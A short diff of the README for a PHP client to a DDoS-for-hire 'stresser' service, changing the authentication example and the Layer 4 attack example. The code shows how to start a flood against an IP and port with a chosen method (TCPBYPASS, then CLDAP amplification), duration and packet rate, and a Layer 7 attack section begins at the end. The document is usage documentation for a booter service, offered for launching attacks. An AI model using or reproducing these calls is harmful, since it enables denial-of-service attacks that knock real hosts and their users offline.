@@ -11,14 +11,14 @@ Available here : https://instant-stresser.com/help/methodsdoc
 ## Authentication
 ```php
 require 'API.php';
-// Username and API Key generated from API Manager website.
-$api = new API("username", "your-apikey");
+// UserID and API Key generated from API Manager website.
+$api = new API("UserID", "your-apikey");
 ```
 
 ## Layer 4 Attack
 ```php
 /* Parameters : IPv4 , Port , Time , Method , Slots, PPS */
-$response = $api->startL4("1.1.1.1", 80, 15, "TCPBYPASS", 1, 100000);
+$response = $api->startL4("1.1.1.1", 80, 15, "CLDAP", 1, 100000);
 ```
 ## Layer 7 Attack
 ```php
